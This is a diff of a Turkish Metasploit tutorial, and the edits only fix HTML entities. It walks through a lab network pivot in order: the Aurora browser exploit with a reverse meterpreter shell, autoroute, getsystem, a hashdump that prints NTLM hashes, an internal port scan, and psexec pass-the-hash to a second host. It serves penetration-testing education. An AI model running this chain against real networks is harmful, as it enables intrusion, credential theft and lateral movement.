@@ -38,8 +38,8 @@ Burada kullanılan `exploit/windows/browser/ms10_002_aurora` modülü sayesinde,
 
 
 ```bash
-msf **&gt;** use exploit/windows/browser/ms10_002_aurora 
-msf exploit**(**ms10_002_aurora**)** **&gt;** show options
+msf **>** use exploit/windows/browser/ms10_002_aurora 
+msf exploit**(**ms10_002_aurora**)** **>** show options
 
 Module options:
 
@@ -59,20 +59,20 @@ Exploit target:
    0   Automatic
 
 
-msf exploit**(**ms10_002_aurora**)** **&gt;** set URIPATH /
-URIPATH **=&gt;** /
-msf exploit**(**ms10_002_aurora**)** **&gt;** set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD **=&gt;** windows/meterpreter/reverse_tcp
-msf exploit**(**ms10_002_aurora**)** **&gt;** set LHOST 192.168.1.101
-LHOST **=&gt;** 192.168.1.101
-msf exploit**(**ms10_002_aurora**)** **&gt;** exploit -j
+msf exploit**(**ms10_002_aurora**)** **>** set URIPATH /
+URIPATH **=>** /
+msf exploit**(**ms10_002_aurora**)** **>** set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD **=>** windows/meterpreter/reverse_tcp
+msf exploit**(**ms10_002_aurora**)** **>** set LHOST 192.168.1.101
+LHOST **=>** 192.168.1.101
+msf exploit**(**ms10_002_aurora**)** **>** exploit -j
 **[*********]** Exploit running as background job.
 
 **[*********]** Started reverse handler on 192.168.1.101:4444 
 **[*********]** Using URL: <a href="http://0.0.0.0:8080/">http://0.0.0.0:8080/</a>
 **[*********]**  Local IP: <a href="http://192.168.1.101:8080/">http://192.168.1.101:8080/</a>
 **[*********]** Server started.
-msf exploit**(**ms10_002_aurora**)** **&gt;**
+msf exploit**(**ms10_002_aurora**)** **>**
 ```
 
 
@@ -81,21 +81,21 @@ Açılan yeni oturumu `sessions -l` komutuyla görebilirsiniz. Aşağıdaki list
 
 
 ```bash
-msf exploit**(**ms10_002_aurora**)** **&gt;** 
+msf exploit**(**ms10_002_aurora**)** **>** 
 **[*********]** Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.201
 **[*********]** Sending stage **(**749056 bytes**)** to 192.168.1.201
-**[*********]** Meterpreter session 1 opened **(**192.168.1.101:4444 -&gt; 192.168.1.201:8777**)** at Mon Dec 06 08:22:29 -0700 2010
+**[*********]** Meterpreter session 1 opened **(**192.168.1.101:4444 -> 192.168.1.201:8777**)** at Mon Dec 06 08:22:29 -0700 2010
 
-msf exploit**(**ms10_002_aurora**)** **&gt;** sessions -l
+msf exploit**(**ms10_002_aurora**)** **>** sessions -l
 
 Active sessions
 **===============**
 
   Id  Type                   Information                                      Connection
   --  ----                   -----------                                      ----------
-  1   meterpreter x86/win32  XEN-XP-SP2-BARE\Administrator @ XEN-XP-SP2-BARE  192.168.1.101:4444 -&gt; 192.168.1.201:8777
+  1   meterpreter x86/win32  XEN-XP-SP2-BARE\Administrator @ XEN-XP-SP2-BARE  192.168.1.101:4444 -> 192.168.1.201:8777
 
-msf exploit**(**ms10_002_aurora**)** **&gt;**
+msf exploit**(**ms10_002_aurora**)** **>**
 ```
 
 
@@ -108,10 +108,10 @@ msf exploit**(**ms10_002_aurora**)** **&gt;**
 
 
 ```bash
-msf exploit**(**ms10_002_aurora**)** **&gt;** sessions -i 1
+msf exploit**(**ms10_002_aurora**)** **>** sessions -i 1
 **[*********]** Starting interaction with 1...
 
-meterpreter **&gt;** ipconfig
+meterpreter **>** ipconfig
 
 Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport
 Hardware MAC: d2:d6:70:fa:de:65
@@ -133,7 +133,7 @@ IP Address  : 192.168.1.201
 Netmask     : 255.255.255.0
 
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -178,7 +178,7 @@ Meterpreter’in sağladığı imkanlardan bir tanesi de `autoroute` script kodu
 
 
 ```bash
-meterpreter **&gt;** run autoroute -h
+meterpreter **>** run autoroute -h
 **[*********]** Usage:   run autoroute **[**-r**]** -s subnet -n netmask
 **[*********]** Examples:
 **[*********]**   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
@@ -195,7 +195,7 @@ meterpreter **&gt;** run autoroute -h
 
 
 ```bash
-meterpreter **&gt;** run autoroute -s 10.1.13.0/24
+meterpreter **>** run autoroute -s 10.1.13.0/24
 **[*********]** Adding a route to 10.1.13.0/255.255.255.0...
 **[**+] Added route to 10.1.13.0/255.255.255.0 via 192.168.1.201
 **[*********]** Use the -p option to list all active routes
@@ -207,7 +207,7 @@ Rotalama yapıldı. Kontrol edelim.
 
 
 ```bash
-meterpreter **&gt;** run autoroute -p
+meterpreter **>** run autoroute -p
 
 Active Routing Table
 **====================**
@@ -216,7 +216,7 @@ Active Routing Table
    ------             -------            -------
    10.1.13.0          255.255.255.0      Session 1
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -233,10 +233,10 @@ Aşağıdaki komutlarla, `getsystem` ile SYSTEM bilgilerini elde ediyoruz, `hash
 
 
 ```bash
-meterpreter **&gt;** getsystem
+meterpreter **>** getsystem
 ...got system **(**via technique 1**)**.
 
-meterpreter **&gt;** run hashdump
+meterpreter **>** run hashdump
 **[*********]** Obtaining the boot key...
 **[*********]** Calculating the hboot key using SYSKEY c2ec80f879c1b5dc8d2b64f1e2c37a45...
 **[*********]** Obtaining the user list and keys...
@@ -251,9 +251,9 @@ SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:ebf9fa44b3204029db5a8a77f
 victim:1004:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
 
 
-meterpreter **&gt;** 
+meterpreter **>** 
 Background session 1? **[**y/N]  
-msf exploit**(**ms10_002_aurora**)** **&gt;**
+msf exploit**(**ms10_002_aurora**)** **>**
 ```
 
 
@@ -266,8 +266,8 @@ Rotalama sayesinde artık 2. bilgisayar ağı ile haberleşebiliyoruz. O zaman b
 
 
 ```bash
-msf exploit**(**ms10_002_aurora**)** **&gt;** use auxiliary/scanner/portscan/tcp 
-msf auxiliary**(**tcp**)** **&gt;** show options
+msf exploit**(**ms10_002_aurora**)** **>** use auxiliary/scanner/portscan/tcp 
+msf auxiliary**(**tcp**)** **>** show options
 
 Module options:
 
@@ -284,13 +284,13 @@ Module options:
    TIMEOUT      1000             yes       The socket connect timeout **in **milliseconds
    VERBOSE      false            no        Display verbose output
 
-msf auxiliary**(**tcp**)** **&gt;** set RHOSTS 10.1.13.0/24
-RHOST **=&gt;** 10.1.13.0/24
-msf auxiliary**(**tcp**)** **&gt;** set PORTS 139,445
-PORTS **=&gt;** 139,445
-msf auxiliary**(**tcp**)** **&gt;** set THREADS 50
-THREADS **=&gt;** 50
-msf auxiliary**(**tcp**)** **&gt;** run
+msf auxiliary**(**tcp**)** **>** set RHOSTS 10.1.13.0/24
+RHOST **=>** 10.1.13.0/24
+msf auxiliary**(**tcp**)** **>** set PORTS 139,445
+PORTS **=>** 139,445
+msf auxiliary**(**tcp**)** **>** set THREADS 50
+THREADS **=>** 50
+msf auxiliary**(**tcp**)** **>** run
 
 **[*********]** 10.1.13.3:139 - TCP OPEN
 **[*********]** 10.1.13.3:445 - TCP OPEN
@@ -298,7 +298,7 @@ msf auxiliary**(**tcp**)** **&gt;** run
 **[*********]** 10.1.13.2:139 - TCP OPEN
 **[*********]** Scanned 256 of 256 hosts **(**100% complete**)**
 **[*********]** Auxiliary module execution completed
-msf auxiliary**(**tcp**)** **&gt;**
+msf auxiliary**(**tcp**)** **>**
 ```
 
 
@@ -315,8 +315,8 @@ Yapılan tarama sonucunda `10.1.13.2` ve `10.1.13.3` olarak 2 IP adresi bulduk. 
 
 
 ```bash
-msf auxiliary**(**tcp**)** **&gt;** use exploit/windows/smb/psexec 
-msf exploit**(**psexec**)** **&gt;** show options
+msf auxiliary**(**tcp**)** **>** use exploit/windows/smb/psexec 
+msf exploit**(**psexec**)** **>** show options
 
 Module options:
 
@@ -336,19 +336,19 @@ Exploit target:
    0   Automatic
 
 
-msf exploit**(**psexec**)** **&gt;** set RHOST 10.1.13.2
-RHOST **=&gt;** 10.1.13.2
+msf exploit**(**psexec**)** **>** set RHOST 10.1.13.2
+RHOST **=>** 10.1.13.2
 
-msf exploit**(**psexec**)** **&gt;** set SMBUser Administrator
-SMBUser **=&gt;** Administrator
+msf exploit**(**psexec**)** **>** set SMBUser Administrator
+SMBUser **=>** Administrator
 
-msf exploit**(**psexec**)** **&gt;** set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
-SMBPass **=&gt;** 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
+msf exploit**(**psexec**)** **>** set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
+SMBPass **=>** 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
 
-msf exploit**(**psexec**)** **&gt;** set PAYLOAD windows/meterpreter/bind_tcp
-PAYLOAD **=&gt;** windows/meterpreter/bind_tcp
+msf exploit**(**psexec**)** **>** set PAYLOAD windows/meterpreter/bind_tcp
+PAYLOAD **=>** windows/meterpreter/bind_tcp
 
-msf exploit**(**psexec**)** **&gt;** exploit
+msf exploit**(**psexec**)** **>** exploit
 
 **[*********]** Connecting to the server...
 **[*********]** Started bind handler
@@ -366,14 +366,14 @@ msf exploit**(**psexec**)** **&gt;** exploit
 **[*********]** Closing service handle...
 **[*********]** Deleting \qNuIKByV.exe...
 **[*********]** Sending stage **(**749056 bytes**)**
-**[*********]** Meterpreter session 2 opened **(**192.168.1.101-192.168.1.201:0 -&gt; 10.1.13.2:4444**)** at Mon Dec 06 08:56:42 -0700 2010
+**[*********]** Meterpreter session 2 opened **(**192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444**)** at Mon Dec 06 08:56:42 -0700 2010
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
 
-Gördüğünüz gibi 2. bilgisayara bağlantı sağladık. Bu bağlantıyı yukarıda `[*] Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -&gt; 10.1.13.2:4444)` satırından da görebileceğiniz gibi `192.168.1.101-192.168.1.201:0 -&gt; 10.1.13.2:4444` rotasını takip ederek yaptık.
+Gördüğünüz gibi 2. bilgisayara bağlantı sağladık. Bu bağlantıyı yukarıda `[*] Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444)` satırından da görebileceğiniz gibi `192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444` rotasını takip ederek yaptık.
 
 
 
@@ -393,7 +393,7 @@ Gördüğünüz gibi 2. bilgisayara bağlantı sağladık. Bu bağlantıyı yuka
 
 
 ```bash
-meterpreter **&gt;** ipconfig
+meterpreter **>** ipconfig
 
 Citrix XenServer PV Ethernet Adapter
 Hardware MAC: 22:73:ff:12:11:4b
@@ -408,7 +408,7 @@ IP Address  : 127.0.0.1
 Netmask     : 255.0.0.0
 
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
